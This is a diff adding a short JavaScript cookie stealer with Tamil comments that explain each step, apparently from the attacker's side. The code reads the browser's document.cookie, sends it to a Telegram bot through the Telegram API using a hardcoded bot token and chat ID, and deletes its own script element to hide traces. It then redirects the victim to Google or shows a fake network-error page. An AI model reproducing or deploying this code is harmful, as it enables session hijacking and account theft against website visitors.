@@ -1,0 +1,27 @@
+// 1. ஹேக்கரோட ரகசிய விபரங்கள் (Variables)
+var token = '8506467954:AAEELpNoXYbt5WfCILodKkMjoqXF07iaUZc'; // அவங்க பாட் டோக்கன்
+var chat_id = '5150898649'; // அவங்க சாட் ஐடி
+var stolen_cookies = document.cookie; // உங்க போன்ல இருக்கிற குக்கீஸ்
+
+// 2. டெலிகிராம் பாட்டுக்கு மெசேஜ் அனுப்பும் URL தயார் செய்தல்
+var telegram_url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=New_Victim_Cookies: ${stolen_cookies}`;
+
+// 3. பின்னணியில் (Background) தகவலை திருடி அனுப்புதல்
+fetch(telegram_url)
+.then(response => {
+    // தகவல் வெற்றிகரமாக அனுப்பப்பட்ட பிறகு...
+    console.log("Data Sent!");
+
+    // 4. தடையமே இல்லாம தன்னைத்தானே அழிக்கும் வேலை (Self-Destruct)
+    var scriptElement = document.currentScript; // இந்த ஸ்கிரிப்ட் எங்க இருக்குன்னு கண்டுபிடிக்கும்
+    if (scriptElement) {
+        scriptElement.parentNode.removeChild(scriptElement); // அந்தப் பக்கத்துல இருந்து ஸ்கிரிப்ட்டை டெலிட் பண்ணிடும்
+    }
+
+    // 5. உங்களை ஏமாற்ற வேற ஒரு பக்கத்துக்கு மாற்றுதல் (Redirect)
+    window.location.href = "https://www.google.com"; 
+})
+.catch(err => {
+    // எர்ரர் வந்தாலும் தடையத்தை அழிச்சுடுவாங்க
+    document.body.innerHTML = "<h1>Network Error! Please try again.</h1>";
+});
